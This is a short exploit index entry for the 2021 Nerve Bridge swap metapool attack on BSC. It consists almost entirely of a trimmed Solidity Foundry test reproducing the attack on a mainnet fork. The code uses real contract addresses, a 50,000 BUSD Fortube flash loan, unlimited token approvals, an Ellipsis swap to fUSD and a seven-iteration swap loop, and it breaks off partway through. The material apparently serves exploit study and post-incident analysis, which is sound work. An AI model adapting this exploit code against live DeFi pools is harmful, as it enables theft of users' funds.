# [?] Nerve Bridge - Swap Metapool Attack

## Summary
Severity: Unknown
Chain: EVM
Component: NerveBridge
Published: 2021-12-14
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-12/NerveBridge_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    uint256 mainnetFork;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IFortube flashloanProvider = IFortube(0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672);
    address nerve3lp = 0xf2511b5E4FB0e5E2d123004b672BA14850478C14;
    address busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address fusd = 0x049d68029688eAbF473097a2fC38ef61633A3C7A;
    address fusdPool = 0x556ea0b4c06D043806859c9490072FaadC104b63;
    address metaSwapPool = 0xd0fBF0A224563D5fFc8A57e4fdA6Ae080EbCf3D3;
    address nerve3pool = 0x1B3771a66ee31180906972580adE9b81AFc5fCDc;

    function setUp() public {
        mainnetFork = vm.createFork("bsc", 12_653_565);
        vm.selectFork(mainnetFork);
        cheats.label(address(flashloanProvider), "flashloanProvider");
    }

    function testExp() public {
        // 1. flashloan 50000 busd from fortube
        flashloanProvider.flashloan(address(this), busd, 50_000 ether, "0x");
        console.log("final busd profit: ", IERC20(busd).balanceOf(address(this)) / 10 ** IERC20(busd).decimals());
    }

    function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata params) external {
        IERC20(busd).approve(fusdPool, type(uint256).max);
        IERC20(fusd).approve(metaSwapPool, type(uint256).max);
        IERC20(nerve3lp).approve(nerve3pool, type(uint256).max);
        IERC20(busd).approve(metaSwapPool, type(uint256).max);

        // 2. swap from 50000 busd to fusd on Ellipsis
        IERC20(fusd).approve(fusdPool, type(uint256).max);
        IcurveYSwap(fusdPool).exchange_underlying(1, 0, IERC20(busd).balanceOf(address(this)), 1);

        for (uint8 i = 0; i < 7; i++) {
            swap();
        }
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-12/NerveBridge_exp.sol_
